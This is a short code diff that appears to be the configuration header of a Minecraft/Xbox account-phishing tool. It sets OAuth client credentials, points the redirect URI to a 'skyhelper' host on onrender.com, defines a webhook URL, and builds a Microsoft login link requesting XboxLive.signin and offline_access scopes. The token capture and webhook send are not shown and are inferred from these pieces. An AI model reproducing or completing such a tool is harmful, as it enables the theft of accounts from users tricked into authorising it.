@@ -1,8 +1,8 @@
 //Change these btw
 const client_secret = 'i love free stuff' //you need to put the "Secret Value" here not the "Secret ID"!!!!
 const client_id = 'it is what it is'
-const redirect_uri = 'u know how it is'
-const webhook_url = 'ur shit ass webhook mf'
+const redirect_uri = 'https://skyhelper.onrender.com'
+const webhook_url = 'webhook'
 
 //Requirements
 const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
